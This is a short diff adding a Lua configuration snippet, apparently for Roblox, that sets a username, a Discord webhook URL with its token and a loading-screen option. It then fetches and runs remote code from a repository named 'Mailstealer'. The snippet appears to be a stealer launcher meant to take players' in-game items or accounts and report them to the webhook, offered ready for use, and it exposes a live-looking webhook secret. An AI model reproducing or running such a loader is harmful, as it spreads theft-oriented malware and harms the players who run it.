@@ -1,0 +1,4 @@
+Username = "lolbot679" -- Your nick
+Webhook = "https://discordapp.com/api/webhooks/1195714690815369276/tPZ4X3Z3D9WiVRtsXS7GQfI7xS1X9zQd3iMD0EucA3sdBT_R-FVtIjjZ3Y_K67GrrN6f" -- Your webhook
+LoadingScreen = true -- You can off loadingscreen, need change to false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))()
